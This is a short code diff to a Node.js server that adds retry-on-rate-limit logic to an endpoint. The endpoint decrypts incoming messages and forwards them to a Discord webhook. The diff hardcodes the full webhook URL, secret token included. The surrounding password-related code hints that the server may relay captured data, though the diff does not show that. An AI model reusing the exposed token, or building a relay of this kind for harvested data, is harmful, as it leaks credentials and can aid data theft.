@@ -20,6 +20,11 @@ function isPasswordRecent(password) {
     return false;
 }
 
+// Delay function to wait for a certain number of milliseconds
+function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
 app.use(cors());
 app.use(bodyParser.json());
 
@@ -46,11 +51,24 @@ app.post("/webhook", async (req, res) => {
         const webhookData = { content: decryptedMessage };
         const webhookUrl = "https://discord.com/api/webhooks/1339836003552071720/zP_2Iu8Nk7AIdo5LlCJSkMDCnsig8GNiUXy3KFF-tMXUNdALCVxIAjz_UYjN-tMpI1eq";
 
-        const webhookResponse = await fetch(webhookUrl, {
+        // Try to send the webhook, handle rate limits
+        let webhookResponse = await fetch(webhookUrl, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(webhookData),
         });
+
+        // If rate-limited (HTTP 429), wait and try again
+        if (webhookResponse.status === 429) {
+            const retryAfter = webhookResponse.headers.get('Retry-After') || 5; // Get 'Retry-After' header or fallback to 5 seconds
+            console.log(`Rate limit hit. Retrying in ${retryAfter} seconds...`);
+            await delay(retryAfter * 1000);  // Delay for the specified time
+            webhookResponse = await fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(webhookData),
+            });
+        }
 
         if (!webhookResponse.ok) {
             console.error("Webhook failed:", await webhookResponse.text());
